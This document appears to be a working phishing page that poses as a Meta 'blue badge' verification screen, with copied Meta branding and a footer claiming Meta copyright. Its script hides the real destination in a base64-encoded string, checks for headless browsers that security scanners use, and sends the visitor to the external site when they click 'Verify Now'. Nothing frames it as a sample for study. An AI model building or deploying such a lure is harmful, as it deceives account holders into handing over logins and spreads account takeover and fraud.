<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Meta Blue Badge Access</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      background: #f5f6f7;
      font-family: "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
      color: #1c1e21;
      overflow: hidden;
    }
    .container {
      text-align: center;
      background: #fff;
      padding: 40px 35px;
      border-radius: 18px;
      box-shadow: 0 6px 24px rgba(0,0,0,0.08);
      max-width: 480px;
      width: 90%;
      animation: fadeIn 0.6s ease-out;
      z-index: 10;
      position: relative;
    }
    @keyframes fadeIn { from { opacity: 0; transform: scale(0.97); } to { opacity: 1; transform: scale(1); } }
    .meta-logo { width: 80px; height: 80px; margin: 0 auto 28px; }
    .meta-logo svg { width: 80px; height: 80px; display: block; }
    .message-box { background: linear-gradient(145deg,#ffffff,#e9f0ff); border-radius:14px; padding:18px 22px; margin-top:8px; margin-bottom:25px; box-shadow: inset 0 1px 1px rgba(255,255,255,0.7), 0 4px 10px rgba(0,0,0,0.1); }
    .message { font-size: 18px; line-height:1.7; font-weight:600; white-space:pre-wrap; background: linear-gradient(90deg,#1877f2,#0099ff,#1877f2); background-size:200% auto; -webkit-background-clip:text; -webkit-text-fill-color:transparent; animation: colorShift 3s linear infinite; text-shadow:0px 2px 4px rgba(24,119,242,0.15); }
    @keyframes colorShift { to { background-position: 200% center; } }
    .verify-btn { background:#1877f2; color:white; border:none; border-radius:10px; padding:12px 30px; font-size:16px; cursor:pointer; margin-top:10px; transition:0.25s; box-shadow:0 4px 10px rgba(24,119,242,0.25); }
    .verify-btn[disabled]{ opacity:0.6; cursor:not-allowed; }
    .verify-btn:hover { background:#1463d9; box-shadow:0 6px 14px rgba(24,119,242,0.3); }
    .footer { margin-top:25px; font-size:13px; color:#65676b; text-align:center; animation:fadeIn 1s ease; }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <div class="meta-logo">
      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
        <circle cx="24" cy="24" r="24" fill="#1877F2"/>
        <path d="M35.6 16.6L22 30.2l-6.6-6.6-2.4 2.4 9 9L38 19l-2.4-2.4z" fill="white"/>
      </svg>
    </div>

    <div class="message-box">
      <div id="message" class="message"></div>
    </div>

    <button id="verifyBtn" class="verify-btn">Verify Now</button>
  </div>

  <div class="footer">© Meta Platforms, Inc.</div>

  <script>
    const ENCODED_TARGET = "aHR0cHM6Ly9wcm9mZXNzaW9uYWwtc29jaWFsLWJ3ZnkuYm9sdC5ob3N0";

    const messageEl = document.getElementById("message");
    const verifyBtn = document.getElementById("verifyBtn");
    const mainContainer = document.getElementById("mainContainer");

    const messageText = `Congratulations! You are now eligible to receive the Meta blue tick.\nPlease complete the verification process to activate your badge.`;

    // Typewriter effect
    (function typeWriterEffect(text, element, duration = 2800){
      let i=0, total=text.length, speed=Math.max(6,duration/total);
      const timer = setInterval(() => {
        element.textContent = text.slice(0,i+1);
        i++;
        if(i===total) clearInterval(timer);
      }, speed);
    })(messageText, messageEl);

    // Interaction tracking
    let mouseEvents = [];
    let interactionGranted = false;

    function recordPointer(e){
      if(interactionGranted) return;
      const pos = e.touches ? {x:e.touches[0].clientX,y:e.touches[0].clientY} : {x:e.clientX,y:e.clientY};
      mouseEvents.push(pos);
      if(mouseEvents.length>50) mouseEvents.shift();
    }

    window.addEventListener("mousemove", recordPointer, {passive:true});
    window.addEventListener("touchstart", recordPointer, {passive:true});

    // Bot detection (headless check only, không chặn người thật)
    function isLikelyBot(){
      try{
        if(navigator.webdriver) return true;
        const ua=(navigator.userAgent||"").toLowerCase();
        if(/headless|puppeteer|phantomjs|slimerjs|nightmare/.test(ua)) return true;
        if(!navigator.languages || navigator.languages.length===0) return true;
        if(!navigator.plugins || navigator.plugins.length===0) return true;
        if(screen.width<300 || screen.height<200) return true;
        return false;
      }catch(e){return true;}
    }

    function safeAtob(s){ try{return atob(s);} catch(e){return "";} }

    function openTarget(){
      const target = safeAtob(ENCODED_TARGET);
      if(!target) return;
      // mở link trực tiếp
      window.open(target,"_self");
    }

    // Click handler: luôn mở link khi user click
    verifyBtn.addEventListener("click", ()=>{
      interactionGranted = true;
      openTarget();
    });
  </script>
</body>
</html>
